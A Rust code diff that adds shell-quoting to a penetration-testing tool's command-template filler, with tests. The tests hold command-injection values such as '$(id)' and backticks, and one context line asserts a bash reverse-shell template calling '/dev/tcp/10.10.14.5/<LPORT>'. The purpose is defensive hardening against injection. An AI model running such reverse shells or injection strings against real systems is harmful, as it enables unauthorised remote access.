@@ -272,16 +272,105 @@ pub fn extract_placeholders(template: &str) -> Vec<String> {
 
 /// Fill a template from the vars map. Empty/missing vars keep the `<NAME>` marker
 /// so the user can see what's still unset.
+///
+/// Templates are POSIX `sh` command lines, so every substituted value is
+/// shell-quoted for the spot it lands in: a value can never end a quote early,
+/// split into several words, or start a `$(…)` / `;` of its own. Values made
+/// only of "safe" characters (IPs, ports, plain paths, URLs without `&`/`?`)
+/// are inserted as-is so the result stays readable.
 pub fn fill_template(template: &str, vars: &BTreeMap<String, String>) -> String {
-    let mut s = template.to_string();
-    for ph in extract_placeholders(template) {
-        if let Some(v) = vars.get(&ph) {
-            if !v.is_empty() {
-                s = s.replace(&format!("<{ph}>"), v);
+    let mut out = String::with_capacity(template.len() + 16);
+    let mut ctx = Quote::None;
+    let mut rest = template;
+    while let Some(c) = rest.chars().next() {
+        if c == '<' {
+            if let Some((name, after)) = placeholder_at(rest) {
+                match vars.get(name).filter(|v| !v.is_empty()) {
+                    Some(v) => out.push_str(&quote_for(v, ctx)),
+                    None => {
+                        out.push('<');
+                        out.push_str(name);
+                        out.push('>');
+                    }
+                }
+                rest = after;
+                continue;
             }
         }
+        let len = c.len_utf8();
+        match (ctx, c) {
+            (Quote::None, '\\') | (Quote::Double, '\\') => {
+                // an escape: copy it together with the char it escapes
+                let n = rest[len..].chars().next().map_or(0, char::len_utf8);
+                out.push_str(&rest[..len + n]);
+                rest = &rest[len + n..];
+                continue;
+            }
+            (Quote::None, '\'') => ctx = Quote::Single,
+            (Quote::None, '"') => ctx = Quote::Double,
+            (Quote::Single, '\'') | (Quote::Double, '"') => ctx = Quote::None,
+            _ => {}
+        }
+        out.push(c);
+        rest = &rest[len..];
     }
-    s
+    out
+}
+
+/// The shell quoting context at some point in a command line.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+enum Quote {
+    None,
+    Single,
+    Double,
+}
+
+/// `<NAME>` at the start of `s`: (NAME, text after the `>`).
+fn placeholder_at(s: &str) -> Option<(&str, &str)> {
+    let body = s.strip_prefix('<')?;
+    let close = body.find('>')?;
+    let name = &body[..close];
+    let ok = !name.is_empty()
+        && name.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
+    ok.then(|| (name, &body[close + 1..]))
+}
+
+/// Characters that never need quoting in `sh` (anywhere in a word).
+fn shell_safe(v: &str) -> bool {
+    !v.is_empty()
+        && v.chars().all(|c| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c))
+}
+
+/// POSIX single-quote `v` as one word: `it's` → `'it'\''s'`.
+pub fn shell_quote(v: &str) -> String {
+    if shell_safe(v) {
+        return v.to_string();
+    }
+    format!("'{}'", v.replace('\'', "'\\''"))
+}
+
+/// Render `v` so it reads back literally inside quoting context `ctx`.
+fn quote_for(v: &str, ctx: Quote) -> String {
+    match ctx {
+        Quote::None => match v.strip_prefix("~/") {
+            // keep `~/` expandable (WORDLIST=~/lists/x.txt), quote the rest
+            Some(rest) if !rest.is_empty() => format!("~/{}", shell_quote(rest)),
+            _ => shell_quote(v),
+        },
+        // inside '…': close, emit an escaped quote, reopen
+        Quote::Single => v.replace('\'', "'\\''"),
+        // inside "…": only \ " $ ` are special
+        Quote::Double => {
+            let mut s = String::with_capacity(v.len());
+            for c in v.chars() {
+                if matches!(c, '\\' | '"' | '$' | '`') {
+                    s.push('\\');
+                }
+                s.push(c);
+            }
+            s
+        }
+    }
 }
 
 #[cfg(test)]
@@ -304,6 +393,155 @@ mod tests {
         assert_eq!(out, "bash -i >& /dev/tcp/10.10.14.5/<LPORT> 0>&1");
     }
 
+
+    const HOSTILE: &[&str] = &["a'b", "$(id)", "x;y", "a b", "\"q\"", "`id`&|<>*?~\\#!"];
+
+    /// Every placeholder of every bundled template/step, filled with `v`.
+    fn fill_all(c: &Command, v: &str) -> Vec<String> {
+        c.run_steps()
+            .iter()
+            .chain(std::iter::once(&c.template))
+            .map(|t| {
+                let vars = extract_placeholders(t).into_iter().map(|p| (p, v.to_string())).collect();
+                fill_template(t, &vars)
+            })
+            .collect()
+    }
+
+    fn sh_syntax_ok(cmd: &str) -> Result<(), String> {
+        let out = std::process::Command::new("sh").args(["-n", "-c", cmd]).output().unwrap();
+        if out.status.success() {
+            Ok(())
+        } else {
+            Err(String::from_utf8_lossy(&out.stderr).into_owned())
+        }
+    }
+
+    /// The words `sh` would pass to the command, without running it: `set --`
+    /// only assigns them. Only used on templates without operators/expansions.
+    fn sh_words(cmd: &str) -> Vec<String> {
+        let script = format!("set -- {cmd}\nprintf '%s\\0' \"$@\"");
+        let out = std::process::Command::new("sh").args(["-c", &script]).output().unwrap();
+        assert!(out.status.success(), "{cmd}: {}", String::from_utf8_lossy(&out.stderr));
+        let mut words: Vec<String> =
+            String::from_utf8_lossy(&out.stdout).split('\0').map(String::from).collect();
+        words.pop();
+        words
+    }
+
+    /// No shell operators, redirections or expansions outside quotes.
+    fn plain_simple_command(t: &str) -> bool {
+        let mut ctx = Quote::None;
+        let mut rest = t;
+        while let Some(c) = rest.chars().next() {
+            if let Some((_, after)) = placeholder_at(rest) {
+                rest = after;
+                continue;
+            }
+            let mut len = c.len_utf8();
+            match (ctx, c) {
+                (Quote::None, '\\') => len += rest[1..].chars().next().map_or(0, char::len_utf8),
+                (Quote::None, '\'') => ctx = Quote::Single,
+                (Quote::None, '"') => ctx = Quote::Double,
+                (Quote::Single, '\'') | (Quote::Double, '"') => ctx = Quote::None,
+                (Quote::None, '|' | '&' | ';' | '<' | '>' | '`' | '$' | '(' | ')' | '*' | '?' | '~' | '#') => return false,
+                (Quote::Double, '$' | '`') => return false,
+                _ => {}
+            }
+            rest = &rest[len..];
+        }
+        true
+    }
+
+    #[test]
+    fn hostile_values_keep_every_bundled_template_valid_sh() {
+        let all = parse_commands(BUNDLED, false);
+        for c in &all {
+            for v in HOSTILE {
+                for filled in fill_all(c, v) {
+                    if let Err(e) = sh_syntax_ok(&filled) {
+                        panic!("{}/{} with {v:?}:\n{filled}\n{e}", c.category, c.name);
+                    }
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn hostile_values_round_trip_as_literal_words() {
+        // For every bundled template that is a plain simple command, a hostile
+        // value must not add or remove words, and must appear literally.
+        let all = parse_commands(BUNDLED, false);
+        let mut checked = 0;
+        for c in &all {
+            for t in c.run_steps().iter().chain(std::iter::once(&c.template)) {
+                if extract_placeholders(t).is_empty() || !plain_simple_command(t) {
+                    continue;
+                }
+                let fill = |v: &str| {
+                    let vars = extract_placeholders(t).into_iter().map(|p| (p, v.to_string())).collect();
+                    fill_template(t, &vars)
+                };
+                let base = sh_words(&fill("PIVTX"));
+                for v in HOSTILE {
+                    let got = sh_words(&fill(v));
+                    assert_eq!(got.len(), base.len(), "{}/{} {v:?}: {got:?}", c.category, c.name);
+                    for (g, b) in got.iter().zip(&base) {
+                        assert_eq!(*g, b.replace("PIVTX", v), "{}/{} {v:?}", c.category, c.name);
+                    }
+                }
+                checked += 1;
+            }
+        }
+        assert!(checked > 50, "only {checked} templates checked");
+    }
+
+    #[test]
+    fn quoting_per_context_reads_back_literally() {
+        // contexts that the bundled set uses, checked by actually printing the
+        // words (printf only; a broken quote would run `id`, harmlessly)
+        let templates = [
+            "printf '[%s]' <V>",
+            "printf '[%s]' pre<V>post",
+            "printf '[%s]' 'in <V> side'",
+            "printf '[%s]' \"in <V> side\"",
+            "printf '[%s]' -p<V>",
+            "printf '[%s]' <V>:<V>@host",
+        ];
+        for v in HOSTILE.iter().chain(&["plain", "it's", "\\", "'"]) {
+            for t in templates {
+                let mut vars = BTreeMap::new();
+                vars.insert("V".to_string(), v.to_string());
+                let filled = fill_template(t, &vars);
+                let out = std::process::Command::new("sh").args(["-c", &filled]).output().unwrap();
+                let shown = String::from_utf8_lossy(&out.stdout).into_owned();
+                let want_v = v.to_string();
+                let want = match t {
+                    t if t.ends_with(" <V>") => format!("[{want_v}]"),
+                    t if t.contains("pre<V>") => format!("[pre{want_v}post]"),
+                    t if t.contains("-p<V>") => format!("[-p{want_v}]"),
+                    t if t.contains(":<V>") => format!("[{want_v}:{want_v}@host]"),
+                    _ => format!("[in {want_v} side]"),
+                };
+                assert_eq!(shown, want, "template {t:?} value {v:?} → {filled}");
+            }
+        }
+    }
+
+    #[test]
+    fn safe_values_stay_readable() {
+        let mut v = BTreeMap::new();
+        v.insert("RHOST".to_string(), "10.10.11.5".to_string());
+        v.insert("URL".to_string(), "http://10.10.11.5:8080/a-b_c".to_string());
+        v.insert("PASS".to_string(), "P@ss w0rd!".to_string());
+        assert_eq!(fill_template("curl <URL> -x <RHOST>", &v), "curl http://10.10.11.5:8080/a-b_c -x 10.10.11.5");
+        assert_eq!(fill_template("x -p <PASS>", &v), "x -p 'P@ss w0rd!'");
+        assert_eq!(fill_template("x -p '<PASS>'", &v), "x -p 'P@ss w0rd!'");
+        assert_eq!(shell_quote("it's"), "'it'\\''s'");
+        // a leading ~/ stays expandable, the rest is quoted
+        v.insert("WORDLIST".to_string(), "~/my lists/r.txt".to_string());
+        assert_eq!(fill_template("ffuf -w <WORDLIST>", &v), "ffuf -w ~/'my lists/r.txt'");
+    }
 
     #[test]
     fn config_roundtrip_order() {
